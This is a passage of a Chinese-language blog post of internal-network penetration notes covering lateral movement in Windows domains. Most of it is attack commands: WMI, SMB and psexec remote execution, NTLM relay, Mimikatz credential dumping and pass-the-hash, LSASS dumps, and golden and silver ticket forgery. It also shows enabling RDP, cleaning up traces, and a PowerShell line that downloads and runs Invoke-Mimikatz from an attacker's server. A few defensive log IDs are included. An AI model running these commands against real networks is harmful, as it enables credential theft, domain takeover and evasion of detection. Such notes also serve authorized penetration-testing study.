title="远程端口转发"></a>远程端口转发</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">跳板机建立端口转发<br>ssh -R <span class="hljs-selector-attr">[远程主机端口]</span>: <span class="hljs-selector-attr">[目标主机]</span>: <span class="hljs-selector-attr">[目标主机端口]</span> <span class="hljs-selector-attr">[攻击者主机ssh]</span><br>攻击机直接连接内网<br>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">2222</span> root@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><h3 id="SOCKS-隧道"><a href="#SOCKS-隧道" class="headerlink" title="SOCKS 隧道"></a>SOCKS 隧道</h3><h3 id="HTTP-隧道"><a href="#HTTP-隧道" class="headerlink" title="HTTP 隧道"></a>HTTP 隧道</h3><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p><a href="https://mp.weixin.qq.com/s/YeGatZSjqfdZNUEuFIHkHg">【内网渗透】横向移动基础-远程执行 (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/Cn0RcDgymcXpYsIacqJqmA">https://mp.weixin.qq.com/s/Cn0RcDgymcXpYsIacqJqmA</a></p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819104900689.png" alt="image-20240819104900689"></p><h2 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a>端口分类</h2><p>135：rpc协议（远程过程调用）支持wmi（windwos管理接口）</p><p> <code>wmic /node:172.18.2.44 /user:&quot;user&quot; /password:&quot;pass&quot; process call create &quot;cmd.exe /c whoami“</code></p><p>日志少，配合wmihacker等工具</p><p>139&#x2F;445：SMB协议：开启ipc$共享</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（基础连接）net use \\IP\ipc$ /u:<span class="hljs-string">&quot;username&quot;</span> password<br><br>（远程服务）sc \\172.18.2.44 create xxx binpath= “cmd.exe /c c:\1.bat” <br><br>（远程计划任务）: schtasks /create /tn <span class="hljs-built_in">test</span> /tr calc.exe /sc /s 192.168.120.150 /u administrator /p <span class="hljs-built_in">test</span> /ru system<br></code></pre></td></tr></table></figure><p>直接配合psexec，atexec，smbexec</p><p>atexec：明文密码或hash，计划任务</p><p>psexec：admin$共享，写文件执行服务</p><p>psexec.py: 同上 可交互</p><p>smbexec：明文密码或hash，服务</p><p>5985：WinRM（windwos远程管理）协议</p><p><code>winrs -r:172.18.2.44 -u:localhost\administrator -p:p@ssw0rd ipconfig</code></p><p><a href="https://xz.aliyun.com/t/14060?time__1311=GqAxuDRD0iq4lEzG7DyGQwfuC0Wx">内网横向下的135,445与5985端口利用 - 先知社区 (aliyun.com)</a></p><p>其中dcomexec, wmiexec，crackmapExec同时利用了135和445与admin$共享，他们通过smb回传结果</p><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求</p><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>利用 AS-REQ 包错误代码</p><p>kerbrute msf(kerberos_enumusers)</p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>获得密码后攻击不同用户</p><p>CrackMapExec kerbrute msf（smb_login）</p><p>防护：事件 ID 为 4768 且结果代码为 0x0 的审核成功的 Kerberos 身份验证服务事件日志</p><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>关闭 <strong>kerberos 预身份验证</strong>，</p><p>向域控 88 端口请求票据(<strong>GetNPUsers</strong> rubeus ASPERoast.ps1 Adfind)</p><p>本地离线爆破（john hashcat）</p><p>防护：</p><ul><li>取消勾选“不要求 kerberos 预身份认证”选项</li><li>重点关注事件 ID 为 4768 且预身份验证为 0 的日志</li></ul><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a><strong>Kerberoasting</strong></h2><p>获取 ST 后爆破 hash</p><p>普通默认机器可以注册 <strong>spn</strong>，但是普通域用户需要权限，攻击需要域内用户，所有用户都可以查询 spn</p><p>服务实例（SPN）会绑定用户，<strong>攻击者拿到服务实例NTLM hash加密的ST，然后ST爆破得到用户的密码</strong></p><p>1.获取 SPN(ServicePrincipal Names)服务主体名称（RiskySPN <strong>GetUserSPNs</strong> PowerView setspn）</p><p>2.请求服务票据(impacket.<strong>GetUserSPNs</strong>,<strong>Rubeus</strong>,POWERSHELL)</p><p>3.导出(cmd.Klist,kerbero,mimikatz,Empire)</p><p>4.破解(kerberoast hashcat)</p><p>防护：</p><ul><li>确保服务账户和密码为强密码</li><li>对域内服务账户权限进行限制</li><li>关注日志事件 ID 为 4769 的日志</li></ul><h2 id="委派-1"><a href="#委派-1" class="headerlink" title="委派"></a>委派</h2><p>主机用户：活动目录中的主机，也叫机器用户</p><p>服务账户：将服务运行起来并加入域时用到的账户，例如 mysql 账户</p><p>委派：将域内用户账户的权限给予服务账户</p><p>查询：Powershgell 脚本，Adfind，Ldapsearch</p><p>非约束委派：<strong>userAccountControl</strong>属性会包含<strong>TRUSTED_FOR_DELEGATION</strong></p><p>可以配合spooler漏洞，利用MS-RPRN强制运行域控通过kerberos去连接开启了非约束委派的机器</p><h2 id="NTLM-RELAY（嗅探）"><a href="#NTLM-RELAY（嗅探）" class="headerlink" title="NTLM RELAY（嗅探）"></a>NTLM RELAY（嗅探）</h2><p>responder 嗅探流量</p><p>受害机器查询不存在的主机名称后抓到 hash</p><p>配合 srf 文件</p><h4 id="打印机"><a href="#打印机" class="headerlink" title="打印机"></a>打印机</h4><p>域内任意用户访问目标机器的打印服务，printerbug.py 脚本会触发 SpoolService Bug，强制目标主机 AD 通过 MS-RPRNRPC 接口对攻击者进行 NTLM 身份认证。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">python3</span> printerbug.py xuan/hack:p<span class="hljs-variable">@ss1234</span>@<span class="hljs-number">10.10.10.10</span> <span class="hljs-number">10.10.10.5</span><br></code></pre></td></tr></table></figure><h4 id="petitPotam"><a href="#petitPotam" class="headerlink" title="petitPotam"></a>petitPotam</h4><h2 id="重放"><a href="#重放" class="headerlink" title="重放"></a>重放</h2><p>利用以上手段获取到 ntlm hash 后 暴力破解之外可以使用中继的方式攻击其他服务</p><p>SMB</p><p>工作组：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">python3</span> ntlmrelayx.py -t smb://<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span> -smb3sup<span class="hljs-keyword">port</span> <span class="hljs-comment">--gpotato --gpotato-startup test.txt</span><br></code></pre></td></tr></table></figure><p>域环境：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">python3</span> smbrelayx.<span class="hljs-keyword">py</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">hostname</span><br><span class="hljs-keyword">python3</span>.<span class="hljs-number">11</span> ntlmrelayx.<span class="hljs-keyword">py</span> -t smb://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">c</span> <span class="hljs-built_in">hostname</span> -smb2support<br>sudo <span class="hljs-keyword">python3</span> MultiRelay.<span class="hljs-keyword">py</span> -t <span class="hljs-number">10.10</span>.<span class="hljs-number">10.30</span> -<span class="hljs-keyword">u</span> ALL<br></code></pre></td></tr></table></figure><p>还有 http ldap 等</p><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>启动默认共享</p><p>用户账密</p><p>打开 445,139</p><h3 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h3><p>（查看目录和杀软）</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\目标IP\ipc$ <span class="hljs-string">&quot;密码&quot;</span> /user:用户名<br>查看：<span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span><br><span class="hljs-keyword">dir</span> \\目标ip\c$<br>tasklist /S ip /<span class="hljs-keyword">U</span> 用户 /P 密码<br></code></pre></td></tr></table></figure><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>at</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">查看时间 net time \\<span class="hljs-built_in">ip</span><br>复制恶意文件 copy 文件名 \\<span class="hljs-built_in">ip</span>\C$<br>创建计划任务 <span class="hljs-meta">at</span> \\ <span class="hljs-built_in">ip</span> 时间 路径<br>痕迹清理 <span class="hljs-meta">at</span> \\<span class="hljs-built_in">ip</span> 任务号 /delete<br></code></pre></td></tr></table></figure><p>Schtasks</p><p>创建计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">创建 schtasks /create /s ip /tn 计划名/sc onstart /tr c:\dayu.txt /ru system /f<br>运行 schtasks /run /s ip /i /tn <span class="hljs-string">&quot;计划名&quot;</span><br>指定ipc账号 /u /p <br>删除 schtasks /delete /s ip /tn <span class="hljs-string">&quot;计划名&quot;</span> -f<br>痕迹清理 net use 名称 /del /y<br></code></pre></td></tr></table></figure><h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>windows servers 2012 R2之后，系统默认安装KB2871997,本地管理员组中只有administrator可以传递（FilterAdministratorToken注册表为0）</p><p>hash 传递到其他机子上，通过 445（SMB 文件共享端口）和 135 端口(RPC 服务共享)横向</p><p>CrackMapExec,MSF(SMB&#x2F;PSEXEC),impacket-smbexec</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">目标机器上：sekurlsa:<span class="hljs-function">:pth</span> <span class="hljs-string">/user</span><span class="hljs-function">:administrator</span> <span class="hljs-string">/domain</span>:<span class="hljs-string">&quot;xxx.com&quot;</span> <span class="hljs-string">/ntlm</span><span class="hljs-function">:6542d35ed5ff6ae5e75b875068c5d3bc</span>  <span class="hljs-string">//</span>自行修改<br>net use \\ip\c$<br></code></pre></td></tr></table></figure><h4 id="获取-hash"><a href="#获取-hash" class="headerlink" title="获取 hash"></a>获取 hash</h4><p>Mimikatz, msf(hashdump | windows&#x2F;gather&#x2F;smart_hashdump) cs sam 表</p><p>prodump (微软自带，抓取 lsass 后本地处理)</p><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/GW14bMYCLoLO8Ox8ncVci65Unwh.png" alt="截图">通过 SAM 和 System</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">手动<br>reg save <span class="hljs-params">hklm</span>\sam sam.hive<br>reg save <span class="hljs-params">hklm</span>\<span class="hljs-params">system</span> <span class="hljs-params">system</span>.hive<br><span class="hljs-title function_">lsadump::sam</span> /sam:sam.hive /<span class="hljs-params">system</span>:<span class="hljs-params">system</span>.hive    <span class="hljs-comment">#文件和mimikatz放在同一目录</span><br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nsis">①<br>mimikatz<br><span class="hljs-title function_">privilege::debug</span>    <span class="hljs-comment">#提升权限</span><br><span class="hljs-title function_">token::elevate</span>    <span class="hljs-comment">#system权限</span><br><span class="hljs-title function_">lsadump::sam</span>    <span class="hljs-comment">#读取本地SAM文件，获取NTML Hash</span><br>②<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;log&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span>    <span class="hljs-comment">#在线读取散列值及明文密码</span><br><br>利用密码增添用户<br><span class="hljs-title function_">privilege::debug</span><br><span class="hljs-title function_">sekurlsa::pth</span> /<span class="hljs-literal">user</span>:administrator /domain:workgroup <br>/ntlm:<span class="hljs-number">6</span>c5fbeb7c83cf7afe04f8d7e38852d52<br></code></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kali开启http<br>Python <span class="hljs-literal">-m</span> SimpleHTTPServer <span class="hljs-number">80</span><br>远程调用<br>powershell <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;ip/Invoke-Mimikatz.ps1&#x27;</span>);<span class="hljs-built_in">Invoke-Mimikatz</span><br></code></pre></td></tr></table></figure><h3 id="lsass-dmp"><a href="#lsass-dmp" class="headerlink" title="lsass.dmp"></a>lsass.dmp</h3><p>导出：</p><p>任务管理器</p><p>procdump</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br></code></pre></td></tr></table></figure><p>mimikatz</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sekurlsa:</span>:minidump lsass.DMP    <span class="hljs-meta">#看到Switch to MINIDUMP 加载成功</span><br><span class="hljs-symbol">sekurlsa:</span>:logonPasswords full    <span class="hljs-meta">#导出密码散列值</span><br></code></pre></td></tr></table></figure><h4 id="Wdigest-明文抓取"><a href="#Wdigest-明文抓取" class="headerlink" title="Wdigest 明文抓取"></a>Wdigest 明文抓取</h4><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/BhYsbhulCo6zlGx43RLcxLgonKh.png" alt="截图"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment">#开启</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="hljs-comment">#关闭</span><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure><p>调整为 1 后重启即可查看明文密码（权限维持可用）</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p>在 Kerberos 认证中，Client 通过 AS（身份认证服务）认证后，AS 会给 Client 一个 Logon Session Key 和 TGT，而 Logon Session Key 并不会保存在 KDC 中，krbtgt 的 NTLM Hash 又是固定的，所以只要得到 krbtgt 的 NTLM Hash，就可以伪造 TGT 和 Logon Session Key 来进入下一步 Client 与 TGS 的交互。而已有了金票后，就跳过 AS 验证，不用验证账户和密码，所以也不担心域管密码修改。</p></blockquote><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><blockquote><p>需要伪造的域管理员用户名<br>完整的域名<br>域 SID<br>krbtgt 的 NTLM Hash</p></blockquote><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">一.<br>klist purge    <span class="hljs-comment">#windows命令行下清除票据</span><br>net config workstation   <span class="hljs-comment">#获取登录域</span><br>nltest /dsgetdc:域名  <span class="hljs-comment">#获取主机</span><br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">二.抓NTLM <span class="hljs-built_in">Hash</span><br>mimikatz.exe<br>privilege::debug<br>lsadump::dcsync /<span class="hljs-built_in">domain</span>:工作域 /<span class="hljs-built_in">all</span> /csv<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">三.查看krbtgt用户的SID<br>法<span class="hljs-number">1</span> lsadump::dcsync /<span class="hljs-keyword">domain</span>:工作域 /<span class="hljs-keyword">user</span>:krbtgt<br>法<span class="hljs-number">2</span> wmic useraccount <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,sid<br></code></pre></td></tr></table></figure><h3 id="生成票据"><a href="#生成票据" class="headerlink" title="生成票据"></a>生成票据</h3><p>mimikatz.exe “kerberos::golden &#x2F;admin:systest &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;krbtgt:39601ebdad1d3e960ed3712398d3ab3a &#x2F;ticket:ticket.kirbi” exit</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/admin</span>：伪造的用户名（任意）<br><span class="hljs-string">/domain</span>：域名称<br><span class="hljs-string">/sid</span>：SID值，注意是去掉最后一个-后面的值<br><span class="hljs-string">/krbtgt</span>：krbtgt的HASH值<br><span class="hljs-string">/ticket</span>：生成的票据名称    <span class="hljs-string">//</span>不是写入内存中的命令<br></code></pre></td></tr></table></figure><p>注入</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::purge<br>kerberos::ptt 票据名<br></code></pre></td></tr></table></figure><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><blockquote><p>在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后,通过自己的 Master Key 解密 ST，从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。 —&gt; 通过 Server 用户 Hash 伪造一个 ST</p></blockquote><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><blockquote><p>域名<br>域 SID(test)<br>目标服务器的 FQDN<br>可利用的服务<br>服务账号的 NTLM Hash<br>要伪造的用户名</p></blockquote><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net config workstation 获取工作域<br>nltest /dsgetdc:域名  获取主机名<br>Whoami /<span class="hljs-built_in">all</span>  SID<br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>&gt;<span class="hljs-built_in">log</span>.txt 获取NTML <span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure><p>生成票据<br>kerberos::golden &#x2F;domain:xiyou.dayu.com &#x2F;sid:S-1-5-21-1816246241-4074331134-2257350442 &#x2F;target:xiyou.xiyou.dayu.com &#x2F;service:cifs &#x2F;rc4:f5369b5accc878d9eedfcde13578e2fc &#x2F;user:testw &#x2F;ptt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">/domain：域名<br>/sid：域的SID值<br>/target: 域控制器全称即FQDN<br>/service: 需要指定相关的服务名，此处为cifs<br>/rc4: 域控的计算机账户ntlm <span class="hljs-built_in">hash</span><br>/user: 要伪造的用户名，任意填写<br></code></pre></td></tr></table></figure><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/PdHnbjpPXoIfJDxA4cqc5Gc2nig.png" alt="截图"></p><p>由于白银票据不与KDC交互，并不要求dns远程解析，socks环境下黄金票据无法远程dns解析会导致NTLM认证失败</p><h2 id="RDP-协议"><a href="#RDP-协议" class="headerlink" title="RDP 协议"></a>RDP 协议</h2><p>① 查询注册表确定是否主机开启了远程桌面</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections <br><span class="hljs-attribute">ps</span>: 若字段值为<span class="hljs-number">0</span>，则表示已启动RDP；若为<span class="hljs-number">1</span>，则表示禁用RDP<br></code></pre></td></tr></table></figure><p>  ② 开启远程桌面</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure><p>  ③ 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0</span><br></code></pre></td></tr></table></figure><p>  ④ 设置防火墙策略放行 3389 端口</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=338<br></code></pre></td></tr></table></figure><h3 id="RDP-Hijack"><a href="#RDP-Hijack" class="headerlink" title="RDP Hijack"></a><strong>RDP Hijack</strong></h3><p>  Windows 系统下，tscon 可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>  可以通过 <code>query user</code> 来列出所有登录的用户列表，得到 id<br>  在 SYSTEM 权限下，使用 <code>tscon &lt;ID&gt;</code> 来切换用户不需要验证密码。</p><h3 id="sharp-RDP"><a href="#sharp-RDP" class="headerlink" title="sharp RDP"></a><a href="https://github.com/0xthirteen/SharpRDP">sharp RDP</a></h3><p>  sharp rdp 可以通过远程桌面协议在远程主机上执行系统命令，且不需要 GUI 客户端。</p><p>  工具需要远程主机开启远程桌面功能，且防火墙放行 3389 端口</p><h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>windows 自带一个工具集，默认不产生日志</p><p>WMI（Windows 管理规范）是一项核心的 Windows 管理技术。用户可以通过 WMI 管理本地和远程主机。<br>Windows 为传输 WMI 数据提供了两个可用的协议：分布式组件对象模型（DCOM）和 Windows 远程管理（WinRM）使得 WMI 对象的查询、事件注册、WMI 类方法的执行和类的创建等操作都能远程运行。</p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a><strong>利用方法</strong></h3><ol><li>通过调用 WMI 的类方法进行远程调用，如 Win32_Process 类中的 Create 方法可以在远程主机上创建进程，Win32_Product 类的 Install 方法可以在远程主机上安装恶意的 MSI</li><li>远程部署 WMI 事件订阅，在特定事件发生时触发</li></ol><h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>1.远程主机的 WMI 服务为开启状态（默认开启）</p><p>2.远程主机防火墙放行 135 端口，这是 WMI 管理的默认端口</p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h3><p>1.通过 WMI 查询远程主机上运行的进程信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wmic <span class="hljs-regexp">/node:192.168.1.131 /u</span>ser:Administrator <span class="hljs-regexp">/password:123456@ process list brief # /</span>node 执行远程主机的地址<br></code></pre></td></tr></table></figure><p>2.创建远程进程<br>通过调用 Win32_Process.Create 方法在远程主机上创建进程，启动 CMD 来执行命令<br>由于 WMIC 在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.131</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:<span class="hljs-number">123456</span>@ process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure><p>3.远程安装 MSI 文件<br>通过调用 Win32_Product.Install 方法，可以控制远程主机安装恶意 MSI 文件，从而获得权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:192.168.1.131 /user:Administrator /password:123456@ product call instal<br></code></pre></td></tr></table></figure><h2 id="SMB-横向"><a href="#SMB-横向" class="headerlink" title="SMB 横向"></a><strong>SMB 横向</strong></h2><p>  SMB（服务器消息块），又称 CIFS（网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。<br>  客户端与服务器建立连接后,客户端可以向服务器发送 SMB 命令允许用户访问共享、打开、读取或者是写入文件。<br>  SMB 消息一般使用 NetBIOS 协议或 TCP 发送，分别使用端口 139 或 445，目前倾向于使用 445 端口。</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h3><ol><li>445 端口开放</li><li>知道账号密码</li></ol><h3 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h3><p>1.建立 IPC 链接，psexec 需要明文或 hash 传递</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd       //需要先有 ipc 链接 -s 以 System 权限运行<br></code></pre></td></tr></table></figure><p>2.或者不用建立 IPC 直接提供明文账户密码</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">psexec</span> \\<span class="hljs-number">192.168.3.21</span> -u administrator -p Admin12345 -s 